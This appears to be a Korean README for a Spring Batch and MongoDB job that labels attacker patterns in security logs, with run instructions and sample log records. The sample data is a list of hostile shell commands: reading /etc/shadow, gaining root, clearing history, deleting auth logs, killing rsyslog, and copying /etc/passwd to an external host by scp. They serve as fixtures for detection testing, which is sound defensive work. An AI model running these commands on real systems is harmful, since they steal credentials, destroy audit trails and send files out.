# Hacker Pattern Detection (Spring Batch + MongoDB)

보안 로그(`security_logs`)에서 해커 패턴을 탐지하는 Spring Batch 모듈입니다.  
MongoDB에서 특정 날짜(`searchDate`)의 로그를 읽어와 패턴 분석 후 라벨을 부여하고, 결과를 로그로 출력합니다.

## 폴더 구성
- `src/main/kotlin/.../HackerPatternDetectionJob.kt` : 배치 잡/스텝/리더/프로세서/라이터 설정
- `src/main/resources/application.yml` : Spring & MongoDB 설정
- `compose.yaml` : 로컬 MongoDB 실행용 Docker Compose 파일

## 요구 사항
- Docker / Docker Compose
- JDK 17+ (Spring Boot 3.x 기준)
- Gradle 8.x

## 로컬 MongoDB 실행
```bash
# 모듈 루트에서
docker compose up -d
# 상태 확인
docker ps
docker compose logs -f mongodb

# 컨테이너 중지
docker compose down

# 데이터 볼륨까지 삭제 (DB 데이터 완전 삭제)
docker compose down -v

# 방법 1) bootRun로 실행 (예: 2025-09-10 대상으로 실행)
./gradlew :mongo-batch:bootRun --args='--spring.batch.job.name=detectHackerPatternJob searchDate=2025-09-10'

# 방법 2) fat jar 실행
./gradlew clean build
java -jar build/libs/*-SNAPSHOT.jar --spring.batch.job.name=detectHackerPatternJob searchDate=2025-09-10

# 데이터삽입

```
1. use cyberops
2. 데이터삽입

   let today = new Date().toISOString().split('T')[0] + 'T';

db.security_logs.insertMany([
{
attackerId: "shadow_walker",
command: "ssh admin@192.168.1.200",
timestamp: new Date(today + "03:15:00Z"),
label: "PENDING_ANALYSIS"
},
{
attackerId: "phantom_blade",
command: "telnet 10.0.0.50 22",
timestamp: new Date(today + "03:25:00Z"),
label: "PENDING_ANALYSIS"
},
{
attackerId: "dark_reaper",
command: "ssh root@172.16.1.100",
timestamp: new Date(today + "03:30:00Z"),
label: "PENDING_ANALYSIS"
},
{
attackerId: "void_hunter",
command: "sudo cat /etc/shadow",
timestamp: new Date(today + "03:35:00Z"),
label: "PENDING_ANALYSIS"
},
{
attackerId: "byte_assassin",
command: "su root",
timestamp: new Date(today + "03:45:00Z"),
label: "PENDING_ANALYSIS"
},
{
attackerId: "system_slayer",
command: "sudo -i",
timestamp: new Date(today + "03:50:00Z"),
label: "PENDING_ANALYSIS"
},
{
attackerId: "code_destroyer",
command: "history -c",
timestamp: new Date(today + "03:55:00Z"),
label: "PENDING_ANALYSIS"
},
{
attackerId: "network_nightmare",
command: "rm /var/log/auth.log",
timestamp: new Date(today + "04:05:00Z"),
label: "PENDING_ANALYSIS"
},
{
attackerId: "data_devourer",
command: "killall rsyslog",
timestamp: new Date(today + "04:15:00Z"),
label: "PENDING_ANALYSIS"
},
{
attackerId: "digital_demon",
command: "scp /etc/passwd user@external.server.com:/tmp/",
timestamp: new Date(today + "04:20:00Z"),
label: "PENDING_ANALYSIS"
},
{
attackerId: "cyber_reaper",
command: "rsync -av /home/data/ backup@remote:/backup/",
timestamp: new Date(today + "04:25:00Z"),
label: "PENDING_ANALYSIS"
},
{
attackerId: "null_terminator",
command: "ls -la",
timestamp: new Date(today + "04:30:00Z"),
label: "PENDING_ANALYSIS"
},
{
attackerId: "root_ravager",
command: "cd /home/user",
timestamp: new Date(today + "04:35:00Z"),
label: "PENDING_ANALYSIS"
},
{
attackerId: "packet_predator",
command: "grep 'error' /var/log/messages",
timestamp: new Date(today + "04:40:00Z"),
label: "PENDING_ANALYSIS"
},
{
attackerId: "kernel_killer",
command: "ps aux | grep java",
timestamp: new Date(today + "04:45:00Z"),
label: "PENDING_ANALYSIS"
}
])
```